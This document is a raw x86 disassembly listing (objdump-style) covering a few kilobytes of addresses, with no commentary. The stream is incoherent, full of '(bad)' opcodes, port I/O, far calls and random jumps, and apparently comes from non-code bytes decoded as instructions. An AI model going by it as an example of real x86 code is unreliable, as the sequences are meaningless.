  413ea1:	mov    ecx,0x61310405
  413ea6:	in     al,0x53
  413ea8:	inc    esi
  413ea9:	xor    ebx,DWORD PTR [ebx-0x530bb81a]
  413eaf:	ret    0x6211
  413eb2:	dec    esi
  413eb3:	(bad)  
  413eb4:	aad    0xb4
  413eb6:	test   ecx,ebx
  413eb8:	xchg   edi,eax
  413eb9:	cli    
  413eba:	popf   
  413ebb:	daa    
  413ebc:	cmp    ah,BYTE PTR [ebx-0x6bc2f3a5]
  413ec2:	inc    esi
  413ec3:	mov    eax,ds:0x7b5d2469
  413ec8:	ss jae 0x413f01
  413ecb:	or     bh,BYTE PTR [eax+0x466c8b0c]
  413ed1:	nop
  413ed2:	add    al,0xf7
  413ed4:	sbb    esi,DWORD PTR [edi-0x4f43d94c]
  413eda:	adc    al,0x26
  413edc:	aas    
  413edd:	dec    ebx
  413ede:	mov    bl,BYTE PTR [edi+ecx*4]
  413ee1:	push   esi
  413ee2:	div    DWORD PTR ds:[edi+0x48479343]
  413ee9:	jecxz  0x413f60
  413eeb:	xor    bl,al
  413eed:	or     ecx,DWORD PTR ds:0x8588b01d
  413ef3:	cmp    ch,0x87
  413ef6:	jp     0x413ebb
  413ef8:	mov    eax,ds:0x92b1353f
  413efd:	push   ecx
  413efe:	push   cs
  413eff:	bound  ebx,QWORD PTR [ecx-0x3b]
  413f02:	cmp    BYTE PTR [esi+0x547d2d7],dh
  413f08:	(bad)  
  413f0a:	jb     0x413f77
  413f0c:	cmp    ebx,ecx
  413f0e:	rcl    DWORD PTR [ecx-0x7c00aa36],cl
  413f14:	sar    dl,1
  413f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f18:	push   esp
  413f19:	xchg   BYTE PTR [ebp+esi*4-0x58f60bd1],ch
  413f20:	mov    eax,ds:0xc63bae8d
  413f25:	shr    dl,1
  413f27:	(bad)  
  413f28:	inc    BYTE PTR [edx]
  413f2a:	dec    ebx
  413f2b:	leave  
  413f2c:	aaa    
  413f2d:	xor    ebx,DWORD PTR [ebp+0x37202abb]
  413f33:	mov    es,WORD PTR [edx-0x66f61361]
  413f39:	jmp    0x413f73
  413f3b:	adc    eax,0x85aa3987
  413f40:	sbb    DWORD PTR [edx+ebp*1-0x1],esp
  413f44:	push   es
  413f45:	pop    ebx
  413f46:	jb     0x413f8b
  413f48:	in     al,dx
  413f49:	add    BYTE PTR [ebp-0x33f41676],dl
  413f4f:	adc    al,0x18
  413f51:	or     al,0xdb
  413f53:	xchg   esp,eax
  413f54:	into   
  413f55:	jmp    0xa1b9ff3b
  413f5a:	mov    ds:0xb6765b92,eax
  413f5f:	jge    0x413fe0
  413f61:	cmp    BYTE PTR ds:0xc4103d0f,0xf3
  413f68:	out    dx,al
  413f69:	mov    ds:0xe1672232,eax
  413f6e:	les    esi,FWORD PTR [ecx+0x6d]
  413f71:	push   ss
  413f72:	adc    al,0xf8
  413f74:	jo     0x413fec
  413f76:	retf   0x3aea
  413f79:	outs   dx,DWORD PTR ds:[esi]
  413f7a:	dec    esi
  413f7b:	push   ebp
  413f7c:	bnd js 0x413fc4
  413f7f:	rol    DWORD PTR [ebp-0x17a8eb8],cl
  413f85:	iret   
  413f86:	jno    0x413fbe
  413f88:	les    esp,FWORD PTR [edx]
  413f8a:	cmp    al,0xf8
  413f8c:	pop    esi
  413f8d:	push   cs
  413f8e:	mov    cs,WORD PTR [eax]
  413f90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f91:	sbb    BYTE PTR [eax-0x6799c725],bh
  413f97:	push   esp
  413f98:	imul   ecx,esp,0x9a7f0fbf
  413f9e:	int3   
  413f9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fa0:	xchg   edi,edx
  413fa2:	xor    DWORD PTR [ebx-0x14],esi
  413fa5:	push   ebx
  413fa6:	inc    ecx
  413fa7:	(bad)  
  413fa8:	std    
  413fa9:	fmul   DWORD PTR [eax+esi*4]
  413fac:	imul   ecx,ebp,0xffffffe2
  413faf:	aaa    
  413fb0:	jp     0x413fc2
  413fb2:	aas    
  413fb3:	clc    
  413fb4:	icebp  
  413fb5:	push   ds
  413fb6:	enter  0xfcc,0xb4
  413fba:	scas   eax,DWORD PTR es:[edi]
  413fbb:	test   al,0x13
  413fbd:	pop    esp
  413fbe:	push   esp
  413fbf:	std    
  413fc0:	adc    al,0x41
  413fc2:	xor    ebx,edi
  413fc4:	ja     0x413fe9
  413fc6:	xor    al,al
  413fc8:	aas    
  413fc9:	mov    gs,WORD PTR [edx-0x69165737]
  413fcf:	push   esp
  413fd0:	pop    esi
  413fd1:	dec    ebx
  413fd2:	retf   0xa7ce
  413fd5:	ds push 0x63c703e0
  413fdb:	mov    ebp,0x4f3a6780
  413fe0:	stc    
  413fe1:	scas   al,BYTE PTR es:[edi]
  413fe2:	jecxz  0x413f66
  413fe4:	js     0x41402c
  413fe6:	outs   dx,BYTE PTR ds:[esi]
  413fe7:	add    BYTE PTR [eax-0x595d7662],ch
  413fed:	mov    ebp,0x44dd906b
  413ff2:	mov    DWORD PTR [ebp-0x63bdcbfa],ebp
  413ff8:	pop    ebx
  413ff9:	out    0xa,al
  413ffb:	add    bl,ch
  413ffd:	mov    BYTE PTR ds:0x403df7b5,dh
  414003:	and    al,0x28
  414005:	lea    esi,[esi-0x19]
  414008:	ins    DWORD PTR es:[edi],dx
  414009:	adc    DWORD PTR ds:0x70d26e7d,edx
  41400f:	call   0x571c049
  414014:	lods   al,BYTE PTR ds:[esi]
  414015:	cmp    DWORD PTR [ebx+0x321097b7],eax
  41401b:	fwait
  41401c:	(bad)  
  41401d:	fidiv  DWORD PTR [eax-0x51]
  414020:	add    esi,esp
  414022:	cmp    ch,BYTE PTR ds:0xe414d8bc
  414028:	mov    ds:0x4caa496,eax
  41402d:	shl    BYTE PTR [edx+0x5e],0x5a
  414031:	pop    es
  414032:	(bad)  
  414033:	xchg   ecx,eax
  414034:	imul   eax,DWORD PTR [ecx+edx*4-0x5698ce91],0xffffffac
  41403c:	adc    BYTE PTR [ebp-0x26],ch
  41403f:	gs and cl,dl
  414042:	lahf   
  414043:	scas   al,BYTE PTR es:[edi]
  414044:	mov    ds:0xe812cf45,eax
  414049:	and    BYTE PTR [edi+ebp*8+0x56],al
  41404d:	stos   DWORD PTR es:[edi],eax
  41404e:	loop   0x414042
  414050:	fst    QWORD PTR [edi+0x7e]
  414053:	into   
  414054:	push   edx
  414055:	cli    
  414056:	jne    0x414045
  414058:	popf   
  414059:	push   cs
  41405a:	ins    BYTE PTR es:[edi],dx
  41405b:	mov    WORD PTR [eax+0x411a7633],es
  414061:	inc    ebp
  414062:	sti    
  414063:	ror    BYTE PTR [edi+0x4cba892d],0xb2
  41406a:	sub    eax,0xbf2acbd2
  41406f:	sti    
  414070:	sub    eax,DWORD PTR [edi]
  414072:	jns    0x413ffc
  414074:	retf   0xe947
  414077:	call   0x974b:0x16ed6ebb
  41407e:	aam    0x1a
  414080:	je     0x414040
  414082:	xor    DWORD PTR [ecx+0x7a5a83ea],ebp
  414088:	lock mov edi,0x48d5c617
  41408e:	in     eax,0xf9
  414090:	push   ebp
  414091:	inc    esp
  414092:	hlt    
  414093:	mov    dl,0xce
  414095:	push   esp
  414096:	cmp    bl,BYTE PTR [esi]
  414098:	dec    edi
  414099:	imul   ebp,DWORD PTR [ebp-0x13],0x7b
  41409d:	pop    edx
  41409e:	and    DWORD PTR [esp+ebp*8],0x7f
  4140a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140a3:	stos   DWORD PTR es:[edi],eax
  4140a4:	and    al,0xb8
  4140a6:	pop    es
  4140a7:	ret    
  4140a8:	fld    TBYTE PTR [edi]
  4140aa:	adc    DWORD PTR [esi-0x3276e0e0],0x75262f54
  4140b4:	clc    
  4140b5:	fdiv   DWORD PTR [ecx+0x24]
  4140b8:	je     0x41410a
  4140ba:	rcl    DWORD PTR [edx],cl
  4140bc:	dec    esi
  4140bd:	cmp    al,BYTE PTR [esi+0x1a]
  4140c0:	lock fnstcw WORD PTR [ebx]
  4140c3:	outs   dx,DWORD PTR ds:[esi]
  4140c4:	sub    al,0x5d
  4140c6:	xor    al,0x9
  4140c8:	mov    ds:0xbf05f2da,al
  4140cd:	dec    edi
  4140ce:	mov    ah,0x53
  4140d0:	and    al,0xa1
  4140d2:	adc    BYTE PTR [edx+ebx*4+0x42a4dcc5],0x92
  4140da:	mov    DWORD PTR [edx],esp
  4140dc:	sub    cl,bl
  4140de:	fisttp WORD PTR [esi]
  4140e0:	fdivr  DWORD PTR [edx-0x1e683835]
  4140e6:	pop    ss
  4140e7:	jg     0x4140cf
  4140e9:	imul   edx,DWORD PTR [edx+0x379231a5],0x6b
  4140f0:	cwde   
  4140f1:	cmp    dl,ah
  4140f3:	sub    DWORD PTR [ebp+0x6271bc8],edi
  4140f9:	push   0x567a4979
  4140fe:	cmp    al,0x10
  414100:	mov    es,WORD PTR [edx+0x61]
  414103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414104:	lock push cs
  414106:	aas    
  414107:	test   BYTE PTR [esi-0x6439e793],bl
  41410d:	xchg   edx,eax
  41410e:	add    ch,BYTE PTR es:[eax+0x6c4ef25a]
  414115:	fld    QWORD PTR [ebp-0x2e193388]
  41411b:	shr    DWORD PTR [ecx],cl
  41411d:	sar    DWORD PTR [ebx],1
  41411f:	or     ebp,edi
  414121:	pop    edx
  414122:	adc    DWORD PTR [edx+eax*2+0x7777ca00],ebp
  414129:	cmp    dh,dh
  41412b:	call   0x411e:0x5029b03a
  414132:	mov    dh,0x4
  414134:	jmp    FWORD PTR ds:0x4b081bfc
  41413a:	(bad)  
  41413b:	mov    eax,ds:0xa6977758
  414140:	mov    bh,0x71
  414142:	das    
  414143:	retf   0x5449
  414146:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414147:	int    0xcf
  414149:	cmp    eax,DWORD PTR [ebp+eax*8-0x70d3a1c2]
  414150:	push   edi
  414151:	lahf   
  414152:	pop    ecx
  414153:	rcr    DWORD PTR [edi-0x4a45f707],1
  414159:	sub    eax,0x3d0830b0
  41415e:	add    BYTE PTR [edi-0x61],bl
  414161:	rol    DWORD PTR [ebx],0x22
  414164:	sub    BYTE PTR [esi-0x33d31ca7],bl
  41416a:	fwait
  41416b:	mov    ds:0x977d1ed8,eax
  414170:	ret    0xe11e
  414173:	cwde   
  414174:	cmp    al,0x71
  414176:	xchg   esi,eax
  414177:	mov    ebp,0xb2ca8022
  41417c:	nop
  41417d:	repz out 0x1d,al
  414180:	int3   
  414181:	xchg   edi,eax
  414182:	ds test eax,0x7df507dd
  414188:	loope  0x414164
  41418a:	xchg   ebx,eax
  41418b:	push   ds
  41418c:	clc    
  41418d:	push   eax
  41418e:	into   
  41418f:	inc    esi
  414190:	nop
  414191:	iret   
  414192:	push   eax
  414193:	pop    ss
  414194:	inc    dx
  414196:	xchg   ebp,eax
  414197:	ins    BYTE PTR es:[edi],dx
  414198:	and    ebx,DWORD PTR [edi]
  41419a:	(bad)  
  41419b:	fdivp  st(3),st
  41419d:	mov    ecx,ecx
  41419f:	fdiv   st,st(0)
  4141a1:	adc    bl,BYTE PTR [ebx+eiz*4]
  4141a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141a5:	ins    DWORD PTR es:[edi],dx
  4141a6:	mov    ecx,0x1ae404aa
  4141ab:	push   esp
  4141ac:	or     ebp,edi
  4141ae:	into   
  4141af:	ret    0x7e4b
  4141b2:	out    0xd6,eax
  4141b4:	leave  
  4141b5:	ret    
  4141b6:	rol    al,0xf2
  4141b9:	ins    BYTE PTR es:[edi],dx
  4141ba:	push   ds
  4141bb:	xchg   esi,eax
  4141bc:	outs   dx,BYTE PTR ds:[esi]
  4141bd:	cmp    DWORD PTR [esi+0x5af1ddd3],ecx
  4141c3:	xchg   edx,eax
  4141c4:	inc    esp
  4141c5:	sub    BYTE PTR [esi-0x6b],ah
  4141c8:	lock out 0x87,eax
  4141cb:	out    0x5b,eax
  4141cd:	sub    dl,bh
  4141cf:	mov    eax,ds:0x25241a50
  4141d4:	rcr    DWORD PTR [ecx],cl
  4141d6:	shr    DWORD PTR [ebp-0x503a7aa1],0xe3
  4141dd:	inc    ebp
  4141de:	cmp    BYTE PTR [ebx+ebp*1],al
  4141e1:	and    BYTE PTR [eax],0x65
  4141e4:	push   ebx
  4141e5:	rol    ch,0xe2
  4141e8:	add    BYTE PTR [edi*4-0x6e93b767],bl
  4141ef:	arpl   bx,bp
  4141f1:	mov    BYTE PTR [ebx+0x12d9d3b4],bl
  4141f7:	mov    ds:0x6ab8e206,eax
  4141fc:	call   0x804d:0x1ab37780
  414203:	scas   eax,DWORD PTR es:[edi]
  414204:	and    BYTE PTR [ebx-0x49],dl
  414207:	or     ecx,DWORD PTR [edx]
  414209:	mov    bh,BYTE PTR [ebp-0x51]
  41420c:	pop    ebp
  41420d:	inc    ecx
  41420e:	jne    0x414262
  414210:	xor    BYTE PTR [eax+0x57],ah
  414213:	xchg   ah,dl
  414215:	sbb    ah,bh
  414217:	pop    DWORD PTR ds:0x238e1374
  41421d:	xchg   edi,eax
  41421e:	inc    edx
  41421f:	lods   al,BYTE PTR ds:[esi]
  414220:	or     esi,ecx
  414222:	push   edx
  414223:	push   0xf5efcb52
  414228:	(bad)  
  41422a:	inc    ecx
  41422b:	(bad)  
  41422c:	shr    BYTE PTR [esi+0x6c],1
  41422f:	loope  0x4141bb
  414231:	fs (bad) 
  414233:	leave  
  414234:	loope  0x414279
  414236:	cmp    edx,DWORD PTR [edi]
  414238:	daa    
  414239:	push   0x1377dc94
  41423e:	out    0xb5,al
  414240:	jmp    0x41420f
  414242:	push   ss
  414243:	mov    esi,DWORD PTR [edx+edi*8]
  414246:	xchg   ebx,eax
  414247:	cld    
  414248:	shl    al,1
  41424a:	jmp    DWORD PTR [edi-0x5a]
  41424d:	xchg   BYTE PTR [edi+0x3e35ae53],ah
  414253:	cmp    ah,BYTE PTR [edx-0x4e3f1217]
  414259:	pop    ecx
  41425a:	dec    edx
  41425b:	inc    ebp
  41425c:	mov    ecx,0xe7608caa
  414261:	mov    esi,0xadd8747e
  414266:	imul   esi,DWORD PTR [edx+0x7],0xffffffb0
  41426a:	xor    al,0xe9
  41426c:	xor    dl,dl
  41426e:	int    0x97
  414270:	sub    bh,BYTE PTR [ebp-0x8c9e857]
  414276:	js     0x4142e8
  414278:	out    0x2e,al
  41427a:	xchg   ecx,eax
  41427b:	sub    BYTE PTR [ebx-0x29b16c54],ch
  414281:	mov    edi,edi
  414283:	fsub   DWORD PTR [eax-0x59c1327b]
  414289:	and    ah,BYTE PTR [edi+0xab6a81d]
  41428f:	daa    
  414290:	jne    0x41421d
  414292:	or     DWORD PTR [ecx+0x1a],esp
  414295:	retf   
  414296:	nop
  414297:	cmp    DWORD PTR [ecx-0x53224039],edx
  41429d:	adc    DWORD PTR [edx-0x67],edi
  4142a0:	push   edx
  4142a1:	fist   DWORD PTR cs:[ebp+0x2c]
  4142a5:	imul   ebx,DWORD PTR [edx-0x6f],0x3581fae
  4142ac:	xor    dl,0xe
  4142af:	mov    ah,0x3a
  4142b1:	iret   
  4142b2:	mov    dh,0x65
  4142b4:	sbb    BYTE PTR [edi+ebx*8],cl
  4142b7:	lods   eax,DWORD PTR ds:[esi]
  4142b8:	add    edx,DWORD PTR [edi+edi*1]
  4142bb:	sub    BYTE PTR [edi-0x54688acd],al
  4142c1:	pop    ebx
  4142c2:	out    dx,al
  4142c3:	jmp    0x7163187f
  4142c8:	and    eax,DWORD PTR [ecx-0x48]
  4142cb:	sbb    bh,BYTE PTR [edx+ebx*4+0xe]
  4142cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142d0:	lods   al,BYTE PTR es:[esi]
  4142d2:	mov    ecx,0x4b425d90
  4142d7:	mov    al,ds:0x96398ef4
  4142dc:	push   ecx
  4142dd:	or     ch,BYTE PTR [ebx-0x14]
  4142e0:	push   esp
  4142e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142e2:	jno    0x414265
  4142e4:	lock mov BYTE PTR [edx+0x34],ch
  4142e8:	aaa    
  4142e9:	jne    0x4142e2
  4142eb:	inc    ebp
  4142ec:	adc    bl,ah
  4142ee:	or     al,0xb
  4142f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142f1:	sbb    esp,DWORD PTR [ebp-0x63d225ff]
  4142f7:	imul   BYTE PTR [esi-0x3264c49c]
  4142fd:	dec    edi
  4142fe:	cwde   
  4142ff:	fldenv [edx+0xa]
  414302:	add    eax,DWORD PTR [edx]
  414304:	dec    edx
  414305:	jnp    0x4142a2
  414307:	daa    
  414308:	push   ds
  414309:	scas   al,BYTE PTR es:[edi]
  41430a:	retf   0x644f
  41430d:	shl    BYTE PTR [edx+0x66ef2d39],1
  414313:	inc    esp
  414314:	aam    0x92
  414316:	jmp    0x10922999
  41431b:	lea    eax,[esi-0x53085505]
  414321:	imul   esp,ebx,0x8398df2a
  414327:	push   edi
  414328:	js     0x414381
  41432a:	xor    cl,BYTE PTR [edi+0x34cc79a5]
  414330:	stos   DWORD PTR es:[edi],eax
  414331:	imul   ebx,DWORD PTR [eax+0x58c46109],0x64e4825a
  41433b:	sub    edx,DWORD PTR ds:0x317254f5
  414341:	jmp    0x414329
  414343:	jo     0x4143a2
  414345:	push   edi
  414346:	jae    0x4142c9
  414348:	cmp    eax,0xc0c55447
  41434d:	mov    ebx,0xf6637d5d
  414352:	mov    WORD PTR [ebp-0x10],es
  414355:	pop    ecx
  414356:	test   eax,ebp
  414358:	gs mov ebp,0x46dd84fa
  41435e:	lahf   
  41435f:	sub    BYTE PTR [ebx-0x1c],cl
  414362:	dec    ecx
  414363:	add    ebp,DWORD PTR [eax]
  414365:	and    al,0xb1
  414367:	sbb    eax,0x1f2bad22
  41436c:	jnp    0x414384
  41436e:	xchg   ecx,eax
  41436f:	xlat   BYTE PTR ds:[ebx]
  414370:	sti    
  414371:	sar    BYTE PTR [eax+0x7d],cl
  414374:	push   es
  414375:	dec    eax
  414376:	cmp    DWORD PTR [edi-0x5b],edi
  414379:	cmp    al,0xe4
  41437b:	fisub  DWORD PTR [ebp+0x6a]
  41437e:	fisttp DWORD PTR [eax]
  414380:	sub    ebx,ebx
  414382:	ins    BYTE PTR es:[edi],dx
  414383:	jne    0x41431b
  414385:	cmp    dl,ch
  414387:	push   eax
  414388:	inc    ebx
  414389:	div    DWORD PTR [ebp-0x33]
  41438c:	fs sub esp,ecx
  41438f:	clc    
  414390:	mov    eax,ds:0x261240f4
  414395:	sbb    ebx,ebp
  414397:	cmp    BYTE PTR [edx-0x23fc32fe],dl
  41439d:	xor    eax,0x7e5db3e6
  4143a2:	js     0x41441c
  4143a4:	inc    eax
  4143a5:	hlt    
  4143a6:	push   es
  4143a7:	adc    edi,esp
  4143a9:	test   DWORD PTR [ecx-0x5ae3c12e],ebx
  4143af:	fs gs inc eax
  4143b2:	mov    ah,0x1a
  4143b4:	jmp    0x91955acb
  4143b9:	mov    ecx,0xc9d1aac7
  4143be:	mov    ch,0x3
  4143c0:	loope  0x414350
  4143c2:	mov    edi,0xd93251b
  4143c7:	pop    ebp
  4143c8:	test   eax,0x8a6675a3
  4143cd:	in     eax,0xc6
  4143cf:	pop    ss
  4143d0:	pop    ebx
  4143d1:	fwait
  4143d2:	retf   0xf0c8
  4143d5:	ficomp WORD PTR [edi-0x8c0a36c]
  4143db:	inc    esi
  4143dc:	jae    0x4143d9
  4143de:	and    bl,BYTE PTR [ebx]
  4143e0:	(bad)
  4143e3:	push   es
  4143e4:	add    bl,dh
  4143e6:	jg     0x41438a
  4143e8:	je     0x41441f
  4143ea:	pop    esp
  4143eb:	sbb    ebp,esp
  4143ed:	pop    ebx
  4143ee:	inc    edi
  4143ef:	popf   
  4143f0:	add    al,0xda
  4143f2:	loope  0x4143ee
  4143f4:	int    0x14
  4143f6:	into   
  4143f7:	pop    esp
  4143f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143f9:	aad    0xda
  4143fb:	lods   eax,DWORD PTR ds:[esi]
  4143fc:	pop    ebp
  4143fd:	out    0x33,al
  4143ff:	jle    0x41441b
  414401:	pop    ss
  414402:	jge    0x414391
  414404:	leave  
  414405:	xlat   BYTE PTR ds:[ebx]
  414406:	sbb    BYTE PTR [esi+0xc195102],ah
  41440c:	fnstsw WORD PTR [eax+ebp*1]
  41440f:	retf   
  414410:	aam    0x26
  414412:	inc    ebx
  414413:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414414:	and    edx,DWORD PTR [edx+0x5db2afdd]
  41441a:	pop    ds
  41441b:	mov    edi,0x94cb6f3
  414420:	mov    bh,0x48
  414422:	and    eax,0x670eaf6a
  414427:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414428:	inc    ecx
  414429:	xchg   edx,eax
  41442a:	sub    cl,BYTE PTR [edi-0x74]
  41442d:	add    edx,DWORD PTR [eax]
  41442f:	stos   BYTE PTR es:[edi],al
  414430:	fdivr  DWORD PTR [esi]
  414432:	loop   0x41442f
  414434:	inc    eax
  414435:	mov    ?,ecx
  414437:	fsubr  DWORD PTR [esi+0x1e35be6f]
  41443d:	cli    
  41443e:	jl     0x414431
  414440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414441:	sub    esp,DWORD PTR [eax+ebp*2-0x2]
  414445:	push   eax
  414446:	outs   dx,DWORD PTR ds:[esi]
  414447:	jb     0x4144ad
  414449:	popa   
  41444a:	lds    eax,FWORD PTR [ecx]
  41444c:	aas    
  41444d:	cwde   
  41444e:	shr    DWORD PTR [esi+0x464f2ae0],cl
  414454:	xor    ebx,DWORD PTR [esi]
  414456:	bnd jnp 0x41441a
  414459:	int    0xec
  41445b:	loope  0x4143fb
  41445d:	cli    
  41445e:	fstp   DWORD PTR [ecx]
  414460:	mov    ah,0x74
  414462:	scas   al,BYTE PTR es:[edi]
  414463:	std    
  414464:	pop    ebp
  414465:	mov    dl,dl
  414467:	bound  edi,QWORD PTR [eax-0x22]
  41446a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41446b:	test   al,0xae
  41446d:	jmp    0xe4812a29
  414472:	aaa    
  414473:	sbb    ch,cl
  414475:	outs   dx,BYTE PTR es:[esi]
  414477:	das    
  414478:	mov    edi,0xde6cd415
  41447d:	loop   0x414426
  41447f:	pop    ecx
  414480:	xchg   ebx,eax
  414481:	jne    0x414466
  414483:	or     esp,DWORD PTR [edx]
  414485:	loopne 0x4144e9
  414487:	push   ebp
  414488:	adc    al,0x4a
  41448a:	into   
  41448b:	popf   
  41448c:	dec    DWORD PTR [edx-0x38]
  41448f:	pop    es
  414490:	xor    BYTE PTR [ebx-0x5e9fc801],al
  414496:	clc    
  414497:	loopne 0x414432
  414499:	and    ebx,DWORD PTR [eax+0xd]
  41449c:	fisttp QWORD PTR [eax+edi*4-0x7d549e1d]
  4144a3:	xchg   edx,eax
  4144a4:	and    edx,DWORD PTR [edi+0x5fa13fc7]
  4144aa:	mov    WORD PTR [ecx+0x4b],fs
  4144ad:	iret   
  4144ae:	push   edx
  4144af:	cli    
  4144b0:	push   ebx
  4144b1:	ins    BYTE PTR es:[edi],dx
  4144b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144b3:	dec    edx
  4144b4:	jns    0x414459
  4144b6:	pop    ebx
  4144b7:	jo     0x414537
  4144b9:	pop    ecx
  4144ba:	iret   
  4144bb:	popa   
  4144bc:	jp     0x41448a
  4144be:	push   ebp
  4144bf:	ficomp WORD PTR [edi-0x41]
  4144c2:	arpl   WORD PTR [eax],bp
  4144c4:	arpl   WORD PTR [ecx],bx
  4144c6:	and    ebp,DWORD PTR [ecx-0x4ecfcc55]
  4144cc:	and    BYTE PTR [edi+eax*8-0x250c9e38],cl
  4144d3:	pop    ebp
  4144d4:	loop   0x4144db
  4144d6:	mov    esi,0x6cef1882
  4144db:	scas   eax,DWORD PTR es:[edi]
  4144dc:	mov    ecx,0x88e653a6
  4144e1:	lock (bad) 
  4144e3:	cmc    
  4144e4:	pop    esp
  4144e5:	(bad)  
  4144e6:	fld    QWORD PTR [edi]
  4144e8:	xchg   esp,eax
  4144e9:	and    eax,0x5a208a90
  4144ee:	enter  0xe56a,0x49
  4144f2:	add    al,0xc3
  4144f4:	and    DWORD PTR [esi+0x1e],edi
  4144f7:	je     0x41454b
  4144f9:	fild   QWORD PTR [ecx-0x7c3972fb]
  4144ff:	popa   
  414500:	dec    edi
  414501:	sub    ah,BYTE PTR [ebx*1+0x272d5fa]
  414508:	or     BYTE PTR [ecx+0x3d],cl
  41450b:	push   0x6a
  41450d:	mov    esp,0x66796062
  414512:	addr16 jb 0x414564
  414515:	ret    
  414516:	xchg   BYTE PTR [ebx+0x79aac40c],ah
  41451c:	not    ah
  41451e:	push   esp
  41451f:	inc    ebx
  414520:	aaa    
  414521:	pop    es
  414522:	or     eax,0xadd7b3ed
  414527:	(bad)  
  414528:	cmp    al,0x16
  41452a:	adc    BYTE PTR [esi+0x5508cf66],0x25
  414531:	repnz add ch,bh
  414534:	jne    0x41459e
  414536:	aad    0x5e
  414538:	jo     0x41455c
  41453a:	or     edx,DWORD PTR [edx]
  41453c:	out    0x36,eax
  41453e:	test   al,0x15
  414540:	idiv   DWORD PTR [eax+0x1e197842]
  414546:	pop    ebx
  414547:	out    0xe1,al
  414549:	push   eax
  41454a:	adc    eax,esp
  41454c:	daa    
  41454d:	out    0xe5,al
  41454f:	shl    esi,0xa4
  414552:	outs   dx,DWORD PTR ds:[esi]
  414553:	mov    WORD PTR [ebp-0x61e153b3],?
  414559:	xchg   esi,eax
  41455a:	push   0xbcb85089
  41455f:	mov    ch,BYTE PTR [eax+0x2626bd6b]
  414565:	jae    0x4145e0
  414567:	xor    al,0xd
  414569:	mov    cl,0xea
  41456b:	add    al,0xc1
  41456d:	mov    bl,0xe1
  41456f:	std    
  414570:	pushf  
  414571:	mov    ch,0x44
  414573:	mov    edx,0x8d536d7d
  414578:	sbb    edi,esi
  41457a:	mov    ds:0xacc31b93,al
  41457f:	call   0x9f03:0xc2d78c74
  414586:	dec    esp
  414587:	ins    DWORD PTR es:[edi],dx
  414588:	pop    eax
  414589:	mov    esp,0xf25faa1c
  41458e:	out    0xcf,al
  414590:	sbb    al,0xc6
  414592:	(bad)  
  414593:	lock cmp BYTE PTR [edx+ebx*4],al
  414597:	mov    eax,0x7c7768b7
  41459c:	sub    eax,0x6d592b07
  4145a1:	mov    eax,ds:0x56ae9d10
  4145a6:	fmul   QWORD PTR [esi+0x7ad10683]
  4145ac:	repz rol DWORD PTR [ebx+0x6b6456de],0x5c
  4145b4:	pop    ss
  4145b5:	and    al,0x6f
  4145b7:	out    0xfe,eax
  4145b9:	in     eax,0x80
  4145bb:	push   0x23
  4145bd:	aad    0x6d
  4145bf:	fidivr WORD PTR [edx+0x50a0c371]
  4145c5:	aaa    
  4145c6:	into   
  4145c7:	xchg   edi,eax
  4145c8:	cmp    bh,BYTE PTR ds:0x8ce34c7
  4145ce:	jnp    0x414572
  4145d0:	jl     0x414625
  4145d2:	stos   DWORD PTR es:[edi],eax
  4145d3:	mov    dh,0x81
  4145d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145d7:	daa    
  4145d8:	add    ebp,DWORD PTR [ebx+eiz*8]
  4145db:	adc    DWORD PTR [eax+0x2d56f07d],ebp
  4145e1:	or     eax,0x864bf5df
  4145e6:	popf   
  4145e7:	push   es
  4145e8:	push   ds
  4145e9:	outs   dx,DWORD PTR ds:[esi]
  4145ea:	sbb    ebx,DWORD PTR [edi+0x70365b80]
  4145f0:	shl    DWORD PTR [eax+eiz*4+0xa2cc08b],cl
  4145f7:	inc    edx
  4145f8:	cmp    ebx,ebx
  4145fa:	(bad)  
  4145fb:	out    dx,eax
  4145fc:	(bad)
  4145ff:	xchg   ecx,eax
  414600:	xchg   esp,eax
  414601:	xchg   edi,eax
  414602:	sub    al,0x48
  414604:	(bad)  
  414605:	xor    bl,BYTE PTR [esi+esi*4-0x7b]
  414609:	ins    DWORD PTR es:[edi],dx
  41460a:	imul   ebx,DWORD PTR [eax-0x31],0xffffffbf
  41460e:	scas   eax,DWORD PTR es:[edi]
  41460f:	ret    0x4e74
  414612:	lods   eax,DWORD PTR ds:[esi]
  414613:	sub    eax,0x758decbb
  414618:	bound  esi,QWORD PTR ds:0x12a4b1fd
  41461e:	leave  
  41461f:	(bad)  
  414620:	or     eax,0xb83c00e7
  414625:	jno    0x41469b
  414627:	add    BYTE PTR [esi-0x2a51b57d],dh
  41462d:	dec    DWORD PTR [ecx+edx*8+0xb21fb41]
  414634:	retf   0xc763
  414637:	retf   
  414638:	pop    ebx
  414639:	jne    0x4145e0
  41463b:	inc    ebp
  41463c:	cmp    al,0x55
  41463e:	xlat   BYTE PTR ds:[ebx]
  41463f:	mov    ch,0xc4
  414641:	sbb    BYTE PTR [ecx+ecx*4+0x7523ad37],ch
  414648:	sar    BYTE PTR [ebx+0x5d2ee2bd],cl
  41464e:	mov    esp,0xc7e3e195
  414653:	clc    
  414654:	and    DWORD PTR [ebx+ebp*8],ebx
  414657:	mov    ebx,0x2bad06fb
  41465c:	sahf   
  41465d:	dec    eax
  41465e:	xor    eax,0xbe35de11
  414663:	iret   
  414664:	aas    
  414665:	push   ecx
  414666:	repnz push ds
  414668:	test   DWORD PTR [ebp+0x625c07a8],eax
  41466e:	pushf  
  41466f:	nop
